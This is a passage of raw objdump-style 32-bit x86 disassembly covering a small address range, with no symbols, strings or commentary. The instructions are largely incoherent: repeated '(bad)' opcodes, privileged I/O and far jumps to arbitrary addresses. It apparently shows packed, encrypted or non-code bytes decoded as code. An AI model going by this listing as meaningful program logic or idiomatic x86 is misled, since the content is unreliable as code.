  40a172:	xchg   edi,eax
  40a173:	xchg   ebp,eax
  40a174:	ins    BYTE PTR es:[edi],dx
  40a175:	or     dh,BYTE PTR [edi-0x11]
  40a178:	cmp    al,0x74
  40a17a:	outs   dx,DWORD PTR ds:[esi]
  40a17b:	add    dl,bl
  40a17d:	add    ebx,edx
  40a17f:	push   es
  40a180:	shl    DWORD PTR [eax+0x1c],0x48
  40a184:	jmp    0xe942f924
  40a189:	sbb    DWORD PTR [eax-0x20],0x54
  40a18d:	or     al,BYTE PTR [edi+0xe]
  40a190:	add    BYTE PTR [ecx],ch
  40a192:	outs   dx,DWORD PTR ds:[esi]
  40a193:	es push eax
  40a195:	cdq    
  40a196:	fild   DWORD PTR [ecx+0x269b]
	...
  40a1ac:	cli    
  40a1ad:	or     eax,0x521795c0
  40a1b2:	push   0x473788
  40a1b7:	mov    ecx,0x11087bea
  40a1bc:	push   edi
  40a1bd:	(bad)  
  40a1be:	(bad)  
  40a1bf:	(bad)  
  40a1c0:	jmp    0x98ee:0xe9f690a0
  40a1c7:	pop    eax
  40a1c8:	jmp    0x7501:0xf85cff01
  40a1cf:	icebp  
  40a1d0:	or     edx,DWORD PTR [ebx]
  40a1d2:	(bad)  
  40a1d3:	(bad)  
  40a1d4:	jmp    0xf42663a8
  40a1d9:	pop    ebx
  40a1da:	mov    edx,ebp
  40a1dc:	jae    0x40a1a8
  40a1de:	jmp    0x40a196
  40a1e0:	stc    
  40a1e1:	add    DWORD PTR [ebp-0xa917d4],ecx
  40a1e7:	xor    al,0xbc
  40a1e9:	add    BYTE PTR [ebp-0xb],dh
  40a1ec:	or     edx,ebp
  40a1ee:	(bad)  
  40a1ef:	jmp    0xe700afe7
  40a1f4:	push   ds
  40a1f5:	into   
  40a1f6:	(bad)  
  40a1f7:	call   0x81856bef
  40a1fc:	hlt    
  40a1fd:	push   es
  40a1fe:	add    cl,ch
  40a200:	xor    BYTE PTR [esp+esi*8+0x76],cl
  40a204:	icebp  
  40a205:	push   es
  40a206:	add    BYTE PTR [ebx],al
  40a208:	in     al,dx
  40a209:	ins    BYTE PTR es:[edi],dx
  40a20a:	add    bl,dl
  40a20c:	rep ins BYTE PTR es:[edi],dx
  40a20e:	add    BYTE PTR [eax+eax*1+0x0],ch
	...
  40a222:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a223:	cmc    
  40a224:	dec    edi
  40a225:	fs (bad) 
  40a228:	test   BYTE PTR [esi-0x17],0x56
  40a22c:	inc    DWORD PTR [eax]
  40a22e:	mov    WORD PTR ds:0x230575ff,cs
  40a234:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a235:	arpl   WORD PTR [ecx+0x5],cx
  40a238:	or     eax,eax
  40a23a:	jge    0x40a23c
  40a23c:	call   0x45bbcf
  40a241:	push   0x3fe2e7
  40a246:	push   es
  40a247:	xchg   edx,eax
  40a248:	push   cs
  40a249:	call   0x40191c
  40a24e:	imul   eax,DWORD PTR [edx+0x168c8dd0],0xb506fff7
  40a258:	push   eax
  40a259:	call   0x40191c
  40a25e:	pusha  
  40a25f:	xor    eax,0xe80fc6f7
  40a265:	or     eax,0x6aff0f58
  40a26a:	leave  
  40a26b:	pushf  
  40a26c:	jmp    0xff4bbaad
  40a271:	mov    ch,0x89
  40a273:	pop    ss
  40a274:	(bad)  
  40a275:	inc    DWORD PTR [esi-0x6617f56f]
  40a27b:	jo     0x40a27c
  40a27d:	jmp    DWORD PTR [eax]
  40a27f:	sub    esp,0x830f86f7
  40a285:	mov    ebp,0x0
	...
  40a296:	add    BYTE PTR [eax],al
  40a298:	jne    0x40a2b1
  40a29a:	(bad)  
  40a29b:	dec    DWORD PTR [ecx-0x6797ee70]
  40a2a1:	add    al,0xef
  40a2a3:	mov    esi,0xf7ec5106
  40a2a8:	push   es
  40a2a9:	ud0    esi,DWORD PTR [ebp-0x6f]
  40a2ad:	sbb    al,0x97
  40a2af:	mov    dl,0xd6
  40a2b1:	push   cs
  40a2b2:	push   DWORD PTR [ebp-0xe94b]
  40a2b8:	lock inc ebp
  40a2ba:	cmp    al,0x90
  40a2bc:	push   edi
  40a2bd:	push   ecx
  40a2be:	or     BYTE PTR [ebp-0xf7bec0],dh
  40a2c4:	inc    edi
  40a2c5:	mov    ebx,0xe5c5fef6
  40a2ca:	sbb    dh,BYTE PTR [eax]
  40a2cc:	aaa    
  40a2cd:	xor    DWORD PTR [eax],ecx
  40a2cf:	jmp    DWORD PTR [ebp+0x1e]
  40a2d2:	adc    bh,bh
  40a2d4:	daa    
  40a2d5:	push   ss
  40a2d6:	pop    eax
  40a2d7:	nop
  40a2d8:	pop    ds
  40a2d9:	sbb    DWORD PTR [eax],ecx
  40a2db:	inc    ebp
  40a2dc:	sbb    BYTE PTR [edi],al
  40a2de:	mov    edi,0x8090ffe
  40a2e3:	jne    0x40a2e9
  40a2e5:	push   ss
  40a2e6:	or     ah,BYTE PTR [edx-0x10]
  40a2e9:	in     eax,dx
  40a2ea:	cmp    edx,eax
  40a2ec:	in     al,0xed
  40a2ee:	lods   eax,DWORD PTR ds:[esi]
  40a2ef:	mov    bl,ah
  40a2f1:	outs   dx,BYTE PTR ds:[esi]
  40a2f2:	inc    eax
  40a2f3:	call   0x8d4783d7
  40a2f8:	xor    eax,0xfeb3da
	...
  40a30d:	add    BYTE PTR [ebp-0x2],bl
  40a310:	add    eax,0x22d5fc75
  40a315:	(bad)  
  40a316:	lock in eax,dx
  40a318:	stc    
  40a319:	mov    edi,0xe672ef
  40a31e:	lock in eax,dx
  40a320:	cmp    eax,0x2eda845
  40a325:	add    al,dh
  40a327:	test   al,0xc0
  40a329:	repz lahf 
  40a32b:	lock add al,BYTE PTR [eax]
  40a32e:	or     ch,dh
  40a330:	cwde   
  40a331:	call   FWORD PTR [ecx]
  40a333:	out    dx,al
  40a334:	cwde   
  40a335:	push   DWORD PTR [edx+ebp*1+0x10]
  40a339:	push   eax
  40a33a:	ins    DWORD PTR es:[edi],dx
  40a33b:	jb     0x40a34d
  40a33d:	div    DWORD PTR [edi+0x70]
  40a340:	mov    ah,0xfe
  40a342:	in     eax,0x6
  40a344:	popa   
  40a345:	pop    es
  40a346:	fld    QWORD PTR [edx]
  40a348:	push   ecx
  40a349:	push   ecx
  40a34a:	rol    BYTE PTR [esi],cl
  40a34c:	jmp    0xe4bb3b4b
  40a351:	sbb    al,0x51
  40a353:	push   es
  40a354:	jmp    0x11217b5c
  40a359:	lds    edi,FWORD PTR [edi]
  40a35b:	add    BYTE PTR [ebx+esi*8+0x759de4f],bh
  40a362:	das    
  40a363:	push   esi
  40a364:	jb     0x40a39a
  40a366:	jne    0x40a2f1
  40a368:	adc    al,0xf
  40a36a:	pop    ds
  40a36b:	(bad)  
  40a36c:	mov    eax,0x79ce0fb1
  40a371:	pop    es
	...
  40a382:	add    BYTE PTR [eax],al
  40a384:	jge    0xff3fb7f5
  40a38a:	std    
  40a38b:	sbb    ebx,esi
  40a38d:	xchg   esi,eax
  40a38e:	cmc    
  40a38f:	push   es
  40a390:	mov    al,BYTE PTR [esi]
  40a392:	add    DWORD PTR [ebx],0xffffffef
  40a395:	mov    ah,0xd8
  40a397:	push   cs
  40a398:	out    0xfe,eax
  40a39a:	fst    QWORD PTR [eax+0x730ceeeb]
  40a3a0:	xlat   BYTE PTR ds:[ebx]
  40a3a1:	(bad)  
  40a3a2:	pop    edi
  40a3a3:	sbb    ah,0xf6
  40a3a6:	lds    eax,FWORD PTR [esi]
  40a3a8:	(bad)  
  40a3a9:	mov    ah,0xcc
  40a3ab:	push   cs
  40a3ac:	mov    edi,0x593fc0fe
  40a3b1:	(bad)  
  40a3b2:	lods   eax,DWORD PTR ds:[esi]
  40a3b3:	cli    
  40a3b4:	outs   dx,DWORD PTR ds:[esi]
  40a3b5:	jae    0x40a3c1
  40a3b7:	mov    ah,0x78
  40a3b9:	test   BYTE PTR [eax-0x6a0160f2],dl
  40a3bf:	push   eax
  40a3c0:	mov    dh,dh
  40a3c2:	lea    eax,[esi]
  40a3c4:	cwde   
  40a3c5:	or     BYTE PTR [esi+eax*1-0x79],bl
  40a3c9:	adc    ch,BYTE PTR [ecx+0x6f378f]
  40a3cf:	jmp    0x40a3c4
  40a3d1:	in     eax,dx
  40a3d2:	mov    ebp,0x413b8701
  40a3d7:	jmp    0x572857ca
  40a3dc:	idiv   ch
  40a3de:	(bad)  
  40a3df:	fcomp  QWORD PTR [ebx-0x1a]
  40a3e2:	xchg   edi,eax
  40a3e3:	xchg   ebp,eax
  40a3e4:	idiv   ch
  40a3e6:	addr16 jmp 0x40a3e9
	...
  40a3f9:	add    bl,dh
  40a3fb:	in     eax,dx
  40a3fc:	mov    ebp,0x413b76d1
  40a401:	jmp    0x372857f4
  40a406:	idiv   ch
  40a408:	(bad)  
  40a409:	pushf  
  40a40a:	sub    esp,esi
  40a40c:	jg     0x40a463
  40a40e:	idiv   ch
  40a410:	addr16 jmp 0x81fe9209
  40a416:	mov    dl,0x3a
  40a418:	inc    ecx
  40a419:	jmp    0xf728580c
  40a41e:	cmc    
  40a41f:	std    
  40a420:	(bad)  
  40a421:	jl     0x40a41e
  40a423:	in     eax,0x67
  40a425:	xor    eax,0x7de7fdf6
  40a42a:	pop    ebp
  40a42b:	(bad)  
  40a42c:	(bad)  
  40a42d:	fisubr WORD PTR [edi]
  40a42f:	jmp    0x40a427
  40a431:	(bad)  
  40a432:	in     eax,dx
  40a433:	out    dx,al
  40a434:	mov    BYTE PTR [esi-0xb],bl
  40a437:	std    
  40a438:	(bad)  
  40a439:	jl     0x40a417
  40a43b:	cmc    
  40a43c:	(bad)  
  40a43d:	mov    esi,0xb60c73f5
  40a442:	addr16 add eax,0xfdf68ce8
  40a448:	(bad)  
  40a449:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a44a:	aaa    
  40a44b:	div    esi
  40a44d:	sahf   
  40a44e:	cmc    
  40a44f:	out    dx,al
  40a450:	ins    BYTE PTR es:[edi],dx
  40a451:	in     ax,dx
  40a453:	std    
  40a454:	(bad)  
  40a455:	and    al,0xfc
  40a457:	out    dx,eax
  40a458:	lock add BYTE PTR [edi+0x3],ch
  40a45c:	(bad)  
  40a45d:	inc    DWORD PTR [eax]
	...
  40a46f:	add    BYTE PTR [ebp+eax*1+0x2e8b7e8],al
  40a476:	add    cl,cl
  40a478:	fwait
  40a479:	(bad)  
  40a47a:	(bad)  
  40a47b:	push   esp
  40a47c:	loop   0x40a49c
  40a47e:	add    esp,0xffffffbd
  40a481:	mov    al,ds:0x3eb69fe
  40a486:	jne    0x40a490
  40a488:	mov    cl,0x83
  40a48a:	mov    bh,bh
  40a48c:	scas   al,BYTE PTR es:[edi]
  40a48d:	add    DWORD PTR [ebp-0x4],0xef000921
  40a494:	mov    edi,0x583cc19a
  40a499:	or     DWORD PTR [eax-0x2d],ebp
  40a49c:	or     eax,0x84fefec8
  40a4a1:	add    edi,esp
  40a4a3:	inc    edi
  40a4a4:	mov    ch,0x3
  40a4a6:	jmp    FWORD PTR [eax-0x3e]
  40a4a9:	into   
  40a4aa:	aas    
  40a4ab:	add    dh,ch
  40a4ad:	int    0x6b
  40a4af:	sub    DWORD PTR [eax+0x9],ecx
  40a4b2:	push   DWORD PTR [ebp+0x11]
  40a4b5:	and    DWORD PTR [eax+0x6803defd],edx
  40a4bb:	fisttp DWORD PTR ds:0xcb67fec8
  40a4c1:	or     BYTE PTR [eax],al
  40a4c3:	cmp    BYTE PTR [esi+0x3fe8068d],0x4
  40a4ca:	(bad)  
  40a4cb:	jmp    DWORD PTR [ecx]
  40a4cd:	adc    bh,BYTE PTR [ecx+eax*2]
  40a4d0:	leave  
  40a4d1:	mov    al,ds:0x0
	...
  40a4e6:	leave  
  40a4e7:	mov    dh,bh
  40a4e9:	jne    0x40a47c
  40a4eb:	and    BYTE PTR [ebx-0x2],bl
  40a4ee:	dec    esi
  40a4ef:	add    ebp,DWORD PTR [eax+0x2f]
  40a4f2:	mov    esp,0xf067fec9
  40a4f7:	out    dx,eax
  40a4f8:	add    al,BYTE PTR [eax]
  40a4fa:	jo     0x40a489
  40a4fc:	lea    eax,[edi]
  40a4fe:	cwde   
  40a4ff:	aaa    
  40a500:	push   es
  40a501:	(bad)  
  40a502:	jg     0x40a581
  40a504:	mov    ?,ebx
  40a506:	ja     0x40a503
  40a508:	cli    
  40a509:	out    0xc7,eax
  40a50b:	pop    ecx
  40a50c:	add    al,0xff
  40a50e:	cmp    DWORD PTR [eax],esi
  40a510:	(bad)  
  40a511:	inc    esp
  40a513:	js     0x40a52c
  40a515:	(bad)  
  40a516:	fucom  st(1)
  40a518:	sbb    bl,BYTE PTR [ecx]
  40a51a:	arpl   WORD PTR [ebp+0x4],cx
  40a51d:	or     esi,DWORD PTR [eax]
  40a51f:	mov    edx,0xfb8867c9
  40a524:	sar    edi,0xa7
  40a527:	inc    ebp
  40a528:	push   ebp
  40a529:	xchg   edx,eax
  40a52a:	das    
  40a52b:	sub    eax,0xed984fb3
  40a530:	add    ch,bh
  40a532:	pop    esi
  40a533:	xchg   esi,eax
  40a534:	ja     0x40a573
  40a536:	mov    cl,0xed
  40a538:	mov    dl,0xfe
  40a53a:	test   ebp,esp
  40a53c:	sbb    dh,BYTE PTR [ebp+0x43]
  40a53f:	add    eax,0xee885804
  40a544:	add    ch,bh
  40a546:	xchg   BYTE PTR ss:[eax+0x3d],ch
	...
  40a55a:	add    BYTE PTR [eax],al
  40a55c:	xor    esi,ebp
  40a55e:	mov    dl,0xfe
  40a560:	pop    ebp
  40a561:	imul   dl
  40a563:	pusha  
  40a564:	mov    ds:0x65e802dc,eax
  40a569:	arpl   WORD PTR [ebx],ax
  40a56b:	(bad)  
  40a56c:	mov    ecx,0x1d000baf
  40a571:	jns    0x40a563
  40a573:	xor    BYTE PTR [ecx+edi*4+0x114a006d],0x3
  40a57b:	jne    0x40a575
  40a57d:	lds    esi,FWORD PTR [edx-0x59f95876]
  40a583:	lea    esi,[ebx+edi*8]
  40a586:	adc    bl,BYTE PTR [esi]
  40a588:	xchg   edi,eax
  40a589:	jno    0x40a56c
  40a58b:	jmp    0x40a5f1
  40a58d:	sti    
  40a58e:	lea    eax,[ebx]
  40a590:	sbb    ch,BYTE PTR [eax]
  40a592:	xchg   BYTE PTR [ecx-0x18],bh
  40a595:	out    dx,al
  40a596:	jno    0x40a59b
  40a598:	ja     0x40a595
  40a59a:	add    ah,BYTE PTR [eax]
  40a59c:	outs   dx,DWORD PTR ds:[esi]
  40a59d:	jno    0x40a580
  40a59f:	jmp    0x40a611
  40a5a1:	sti    
  40a5a2:	add    ebx,DWORD PTR gs:[edi+0x71]
  40a5a6:	pop    ebp
  40a5a7:	add    ebx,ebp
  40a5a9:	push   cs
  40a5aa:	inc    ecx
  40a5ab:	int    0x7a
  40a5ad:	sti    
  40a5ae:	dec    ebp
  40a5af:	int    0x31
  40a5b1:	add    ch,cl
  40a5b3:	pop    eax
  40a5b4:	imul   ebp,edx,0xffffff99
  40a5b7:	retf   0x68ec
  40a5ba:	test   BYTE PTR [eax+esi*8+0x6],0xe9
  40a5bf:	add    eax,DWORD PTR [eax]
	...
  40a5d1:	add    al,dh
  40a5d3:	das    
  40a5d4:	inc    edx
  40a5d5:	add    esp,DWORD PTR [ebp-0x48c8eef2]
  40a5db:	push   es
  40a5dc:	jmp    0x6a4f4a6f
  40a5e1:	cld    
  40a5e2:	icebp  
  40a5e3:	je     0x40a5bd
  40a5e5:	push   es
  40a5e6:	and    BYTE PTR [edi-0x7a71f9ee],al
  40a5ec:	mov    dl,0x5f
  40a5ee:	dec    esp
  40a5ef:	je     0x40a5d5
  40a5f1:	imul   ebp,DWORD PTR [edi-0x20fbbafb],0xadebed74
  40a5fb:	pop    edx
  40a5fc:	jmp    0xf82fe04
  40a601:	inc    ebp
  40a602:	lock outs dx,BYTE PTR ds:[esi]
  40a604:	jle    0x40a646
  40a606:	xor    DWORD PTR [edi],eax
  40a608:	rcr    DWORD PTR [ecx-0x4a0005a1],1
  40a60e:	inc    dh
  40a610:	jae    0x40a656
  40a612:	repz jae 0x40a61d
  40a615:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a616:	clc    
  40a617:	inc    ecx
  40a618:	ds sub ah,ch
  40a61b:	test   ebx,eax
  40a61d:	in     eax,dx
  40a61e:	inc    dh
  40a620:	je     0x40a656
  40a622:	repz adc edx,DWORD PTR [edi-0x39]
  40a626:	xor    al,0x7
  40a628:	mov    ds:0x48330b,eax
  40a62d:	push   0xffffffb0
  40a62f:	fs aas 
  40a631:	sub    ah,ch
  40a633:	push   es
  40a634:	jne    0x40a627
	...
  40a646:	add    BYTE PTR [eax],al
  40a648:	repnz adc ecx,DWORD PTR [ebx+0x1f]
  40a64c:	lods   eax,DWORD PTR ds:[esi]
  40a64d:	push   es
  40a64e:	jmp    0x40a660
  40a650:	fiadd  WORD PTR [esi]
  40a652:	push   0xffffffe8
  40a654:	repnz xor esp,DWORD PTR [edx+0x6]
  40a658:	mov    ch,0x6
  40a65a:	call   esp
  40a65c:	xchg   esi,eax
  40a65d:	cmp    BYTE PTR [ecx-0x17],al
  40a660:	jbe    0x40a628
  40a662:	or     esp,edx
  40a664:	xor    esi,DWORD PTR [esi+0x21]
  40a667:	fsub   DWORD PTR es:[edi+edi*1-0x58]
  40a66c:	repz stc 
  40a66e:	adc    al,0x8a
  40a670:	mov    cl,0x47
  40a672:	add    BYTE PTR [edx+0x2f],ch
  40a675:	push   es
  40a676:	(bad)  
  40a677:	fsubr  QWORD PTR [esi+0x2ae94138]
  40a67d:	add    esp,DWORD PTR [edx-0x4a]
  40a680:	xor    al,0x7
  40a682:	add    cl,ch
  40a684:	repz push es
  40a686:	jmp    0x40a670
  40a688:	xor    al,0x8e
  40a68a:	ret    0xab42
  40a68d:	mov    DWORD PTR [edi],0x623a74e9
  40a693:	push   cs
  40a694:	xor    eax,DWORD PTR [edi]
  40a696:	add    BYTE PTR [eax],al
  40a698:	std    
  40a699:	daa    
  40a69a:	push   DWORD PTR ds:0x41482b
  40a6a0:	adc    WORD PTR [ebx+0x3e],sp
  40a6a4:	fadd   DWORD PTR [edx]
  40a6a6:	add    esp,0xffffff8d
  40a6a9:	push   es
  40a6aa:	adc    eax,0x4b
	...
  40a6bb:	add    BYTE PTR [eax],al
  40a6bd:	add    BYTE PTR [edi-0x6338ffbc],dh
  40a6c3:	arpl   WORD PTR [edi],di
  40a6c5:	inc    ecx
  40a6c6:	cdq    
  40a6c7:	add    eax,0xc2890000
  40a6cc:	push   ebx
  40a6cd:	mov    esp,DWORD PTR [ebp-0x7d]
  40a6d0:	ret    0xaf0
  40a6d3:	mov    WORD PTR [ebx+0x8],es
  40a6d6:	push   edx
  40a6d7:	lds    esi,FWORD PTR [edx+0xb]
  40a6da:	retf   0xc79
  40a6dd:	add    BYTE PTR ds:0x59388000,bh
  40a6e3:	jo     0x40a6ec
  40a6e5:	sub    ebx,DWORD PTR [ecx]
  40a6e7:	pop    esp
  40a6e8:	leave  
  40a6e9:	ret    0x541
  40a6ec:	cmp    BYTE PTR [eax],0x77
  40a6ef:	jno    0x40a701
  40a6f1:	and    DWORD PTR [ebx+eiz*2],0x3f
  40a6f5:	inc    ecx
  40a6f6:	sbb    DWORD PTR ds:0xc5420775,eax
  40a6fc:	pop    ecx
  40a6fd:	leave  
  40a6fe:	retf   
  40a6ff:	or     al,BYTE PTR [eax]
  40a701:	and    BYTE PTR [ecx],0x87
  40a704:	je     0x40a744
  40a706:	xchg   edx,eax
  40a707:	push   ecx
  40a708:	or     al,0x4a
  40a70a:	mov    ah,al
  40a70c:	add    DWORD PTR [ebx],ecx
  40a70e:	(bad)  [ecx+0x6]
  40a711:	and    DWORD PTR [eax+ecx*1+0x1],0x75
  40a716:	int    0x2b
  40a718:	shr    bl,0xed
  40a71b:	add    eax,0x41620c4d
  40a720:	or     al,0x5
	...
  40a732:	add    BYTE PTR [eax],al
  40a734:	lock in eax,dx
  40a736:	push   es
  40a737:	add    al,dh
  40a739:	scas   al,BYTE PTR es:[edi]
  40a73a:	loop   0x40a73d
  40a73c:	and    dh,dl
  40a73e:	sbb    al,0x8d
  40a740:	mov    bh,0xb9
  40a742:	push   edx
  40a743:	mov    eax,DWORD PTR [ebp-0x1a]
  40a746:	inc    esp
  40a747:	push   eax
  40a748:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a749:	xor    edx,DWORD PTR [eax]
  40a74b:	push   edx
  40a74c:	mov    BYTE PTR [ebx+0x4697fe9a],bh
  40a752:	pop    ebp
  40a753:	leave  
  40a754:	mov    dl,0xe6
  40a756:	add    ch,BYTE PTR [ebx]
  40a758:	stos   DWORD PTR es:[edi],eax
  40a759:	mov    DWORD PTR [ebp+0xc],esi
  40a75c:	jg     0x40a759
  40a75e:	or     ch,BYTE PTR [edx-0x10]
  40a761:	adc    eax,DWORD PTR [edi+edi*8]
  40a764:	add    eax,0xf0414221
  40a769:	ins    BYTE PTR es:[edi],dx
  40a76a:	(bad)  
  40a76b:	por    mm5,QWORD PTR ds:0xa3696577
  40a772:	(bad)  
  40a773:	imul   edi,esp,0xa0f04662
  40a779:	inc    ebp
  40a77a:	test   BYTE PTR [ebx+0x6d413f],0x65
  40a781:	mov    ds:0xbb2f4ff2,eax
  40a786:	(bad)  
  40a787:	(bad)  
  40a788:	std    
  40a789:	mov    BYTE PTR [eax+0x41],al
  40a78c:	lock ins BYTE PTR es:[edi],dx
  40a78e:	(bad)  
  40a78f:	or     ebp,ebx
  40a791:	sub    eax,0xab7d3376
  40a796:	repnz add BYTE PTR [eax],0x0
	...
  40a7aa:	mov    cl,ah
  40a7ac:	add    dh,BYTE PTR [ebx+ebx*8+0x74]
  40a7b0:	inc    ebx
  40a7b1:	or     BYTE PTR [eax+0x7cb4ea9d],dh
  40a7b7:	lock dec BYTE PTR [edx-0xfb9a538]
  40a7be:	fild   WORD PTR [esi]
  40a7c0:	pop    ecx
  40a7c1:	or     al,0x43
  40a7c3:	clc    
  40a7c4:	pop    eax
  40a7c5:	or     al,bl
  40a7c7:	(bad)  [edi+edi*8-0x3a]
  40a7cb:	ins    BYTE PTR es:[edi],dx
  40a7cc:	jmp    0x1937dc61
  40a7d1:	(bad)  
  40a7d2:	fcom   QWORD PTR [ebx-0x1]
  40a7d5:	inc    esp
  40a7d6:	lock sub DWORD PTR [esp+ecx*1+0x79ae061a],0xffffff9c
  40a7df:	idiv   ebx
  40a7e1:	push   edx
  40a7e2:	(bad)  
  40a7e3:	inc    ebp
  40a7e4:	jmp    0x624f5b6b
  40a7e9:	ret    
  40a7ea:	sub    cl,dh
  40a7ec:	stos   BYTE PTR es:[edi],al
  40a7ed:	or     al,0xf0
  40a7ef:	push   ecx
  40a7f0:	jb     0x40a7e2
  40a7f2:	jbe    0x40a865
  40a7f4:	in     eax,dx
  40a7f5:	(bad)  
  40a7f6:	in     al,0xe
  40a7f8:	jbe    0x40a813
  40a7fa:	retf   0x2837
  40a7fd:	add    al,0x73
  40a7ff:	ret    0x53f0
  40a802:	push   edi
  40a803:	jno    0x40a7f2
  40a805:	inc    ah
  40a807:	push   cs
  40a808:	push   esi
  40a809:	sbb    DWORD PTR [esi+0x3a837],ebx
	...
  40a81f:	add    BYTE PTR [ebx-0x3e],dh
  40a822:	lock mov bl,BYTE PTR [esi+edx*1-0x3237fd90]
  40a82a:	sub    dl,BYTE PTR [eax]
  40a82c:	lock push ecx
  40a82e:	(bad)  
  40a82f:	lock jb 0x40a7f4
  40a832:	adc    bh,bh
  40a834:	pushf  
  40a835:	or     dl,BYTE PTR [ecx]
  40a837:	add    esp,DWORD PTR [ecx-0x9]
  40a83a:	adc    eax,0xe571300b
  40a83f:	int3   
  40a840:	xor    DWORD PTR [esi],edx
  40a842:	jmp    0x114b2545
  40a847:	loopne 0x40a7e6
  40a849:	idiv   bh
  40a84b:	cmc    
  40a84c:	cli    
  40a84d:	(bad)  
  40a84e:	jae    0x40a835
  40a850:	lods   al,BYTE PTR ds:[esi]
  40a851:	enter  0xe90f,0xd6
  40a855:	jnp    0x40a86b
  40a857:	fimul  WORD PTR [eax+0x17]
  40a85a:	call   0xff36990b
  40a85f:	loop   0x40a814
  40a861:	jnp    0x40a867
  40a863:	mov    al,0xb1
  40a865:	push   es
  40a866:	add    BYTE PTR [ecx+0x36],dl
  40a869:	ss inc ecx
  40a86b:	jmp    0x287e848b
  40a870:	hlt    
  40a871:	fimul  WORD PTR [ebx+0xaf5967f]
  40a877:	test   eax,0x2f680608
  40a87c:	mov    DWORD PTR [edi+0x0],0x41351701
  40a883:	jmp    0x40a888
	...
  40a894:	add    BYTE PTR [eax],al
  40a896:	mov    ebp,DWORD PTR [edi-0x6a]
  40a899:	jle    0x40a909
  40a89b:	add    eax,eax
  40a89d:	out    0x6f,al
  40a89f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a8a0:	add    cl,ch
  40a8a2:	repz add DWORD PTR [ebp+eiz*2-0x3d],0xfffffff5
  40a8a8:	je     0x40a897
  40a8aa:	dec    esi
  40a8ab:	sbb    eax,DWORD PTR [esi+0x16]
  40a8ae:	lods   eax,DWORD PTR ds:[esi]
  40a8af:	push   es
  40a8b0:	and    DWORD PTR ds:0xf6c001eb,0x68
  40a8b7:	popf   
  40a8b8:	add    cl,ch
  40a8ba:	repz pusha 
  40a8bc:	add    BYTE PTR [eax+edi*4-0x12],ah
  40a8c0:	dec    edi
  40a8c1:	ret    
  40a8c2:	push   ds
  40a8c3:	outs   dx,BYTE PTR ds:[esi]
  40a8c4:	(bad)  
  40a8c5:	out    0xac,al
  40a8c7:	push   es
  40a8c8:	call   DWORD PTR [edi+ecx*1-0x3958eb0b]
  40a8cf:	inc    edi
  40a8d0:	add    BYTE PTR [edx+0x37],ch
  40a8d3:	sbb    cl,BYTE PTR [ebx]
  40a8d5:	add    cl,cl
  40a8d7:	add    al,0x85
  40a8d9:	push   0xffffffd8
  40a8db:	or     DWORD PTR [eax],eax
  40a8dd:	jmp    DWORD PTR [edx+esi*8-0x3]
  40a8e1:	adc    eax,0x41347b
  40a8e6:	dec    edx
  40a8e7:	mov    edi,0x5ed18302
  40a8ec:	je     0x40a8f3
  40a8ee:	mov    al,0x4e
  40a8f0:	add    DWORD PTR [eax],eax
  40a8f2:	leave  
  40a8f3:	test   BYTE PTR [ebx-0xc],al
  40a8f6:	fldenv [eax+0x0]
  40a8f9:	inc    DWORD PTR [eax]
	...
  40a90b:	add    ah,ah
  40a90d:	repnz out 0x14,al
  40a910:	pop    esi
  40a911:	repz std 
  40a913:	or     ecx,DWORD PTR [ecx+0x3]
  40a916:	test   BYTE PTR [ecx],bh
  40a918:	mov    BYTE PTR [ecx],cl
  40a91a:	add    BYTE PTR [ebx+0xefeeeec],al
  40a920:	adc    eax,0x89000124
  40a925:	mov    DWORD PTR [esi],esi
  40a927:	add    BYTE PTR [esi-0x73],bh
  40a92a:	and    al,0x1
  40a92c:	pop    ecx
  40a92d:	or     DWORD PTR [eax-0x75],edx
  40a930:	add    al,0xef
  40a932:	inc    eax
  40a933:	push   edx
  40a934:	jno    0x40a99a
  40a936:	mov    edi,edi
  40a938:	into   
  40a939:	push   eax
  40a93a:	mov    DWORD PTR [ebp-0x5f],eax
  40a93d:	repz jae 0x40a934
  40a940:	sahf   
  40a941:	jge    0x40a92b
  40a943:	push   edx
  40a944:	mov    cl,0x9d
  40a946:	mov    edi,edi
  40a948:	scas   al,BYTE PTR es:[edi]
  40a949:	retf   
  40a94a:	inc    ebx
  40a94b:	lock sbb DWORD PTR [ecx],ecx
  40a94e:	add    BYTE PTR [eax],al
  40a950:	(bad)  
  40a951:	dec    ebp
  40a952:	in     al,dx
  40a953:	add    BYTE PTR [ecx],cl
  40a955:	or     DWORD PTR [eax],eax
  40a957:	or     DWORD PTR [ebx+edx*2],0x3f
  40a95b:	inc    ecx
  40a95c:	sbb    DWORD PTR [ecx],ecx
  40a95e:	jne    0x40a9b2
  40a960:	lock xchg DWORD PTR [edi+0x40],eax
  40a964:	mov    cl,0xdf
  40a966:	jmp    0x5850:0x2df9429
  40a96d:	mov    ecx,0x4142
	...
  40a982:	lock cld 
  40a984:	jne    0x40a96e
  40a986:	enter  0x5f12,0x0
  40a98a:	lock clc 
  40a98c:	ret    0xe873
  40a98f:	push   ebp
  40a990:	push   edx
  40a991:	inc    eax
  40a992:	xor    esi,ebx
  40a994:	jmp    0x4850:0x2de1c0d
  40a99b:	adc    BYTE PTR [ecx+eax*2-0x10],al
  40a99f:	mov    ah,0x75
  40a9a1:	call   0x9f183e
  40a9a6:	lock call 0x16231d6e
  40a9ac:	pop    edx
  40a9ad:	inc    eax
  40a9ae:	xor    esi,ebx
  40a9b0:	jmp    0x850:0x2de2bf1
  40a9b7:	cmp    BYTE PTR [ecx+eax*2-0x10],al
  40a9bb:	mov    WORD PTR [ebp-0x18],?
  40a9be:	pop    eax
  40a9bf:	pop    edx
  40a9c0:	pop    esi
  40a9c1:	add    al,dh
  40a9c3:	mov    BYTE PTR [edx],bl
  40a9c5:	push   0x431dd3
  40a9ca:	dec    eax
  40a9cb:	inc    esi
  40a9cc:	pop    eax
  40a9cd:	add    al,dh
  40a9cf:	lods   eax,DWORD PTR ds:[esi]
  40a9d0:	push   0x63
  40a9d2:	mov    al,0x9e
  40a9d4:	add    bh,bh
  40a9d6:	lds    eax,FWORD PTR [ebp-0x15]
  40a9d9:	jns    0x40a970
  40a9db:	fld    QWORD PTR [edx]
  40a9dd:	or     esi,DWORD PTR [eax]
  40a9df:	mov    ebx,0x31ad8d6c
  40a9e4:	push   ebx
  40a9e5:	push   0x0
	...
  40a9f7:	add    cl,dh
